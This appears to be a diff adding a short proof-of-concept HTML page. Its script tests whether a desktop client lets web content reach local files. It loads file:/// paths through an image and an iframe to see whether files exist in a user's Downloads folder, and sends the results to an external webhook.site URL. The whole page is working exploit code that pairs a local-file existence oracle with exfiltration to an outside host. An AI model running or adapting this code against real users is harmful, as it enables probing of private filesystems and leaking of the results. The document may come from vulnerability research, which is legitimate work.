@@ -1,0 +1,29 @@
+<!doctype html><title>probe</title>
+<script>
+var WB='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438';
+function beacon(s){try{new Image().src=WB+'?s='+encodeURIComponent(s.slice(0,600))}catch(e){}}
+beacon('httpprobe-ran origin='+location.origin);
+var out={};
+function probe(p,tag){
+  return new Promise(function(res){
+    var i=new Image(), done=false;
+    i.onload=function(){done=true;out[tag]='LOAD';res()};
+    i.onerror=function(){done=true;out[tag]='ERROR';res()};
+    setTimeout(function(){if(!done){done=true;out[tag]='TIMEOUT';res()}},5000);
+    i.src='file:///'+p+'?bilipc=1';
+  });
+}
+(async function(){
+  await probe('C:/Users/aaa/Downloads/poc.html','exists');
+  await probe('C:/Users/aaa/Downloads/notexist_xyz123.html','notexist');
+  await new Promise(function(res){
+    var f=document.createElement('iframe'), done=false;
+    f.onload=function(){done=true;out['iframe']='LOAD';res()};
+    f.onerror=function(){done=true;out['iframe']='ERROR';res()};
+    setTimeout(function(){if(!done){done=true;out['iframe']='TIMEOUT';res()}},5000);
+    f.src='file:///C:/Users/aaa/Downloads/poc.html?bilipc=1';
+    document.body.appendChild(f);
+  });
+  beacon('PROBE_RESULT '+JSON.stringify(out));
+})();
+</script>
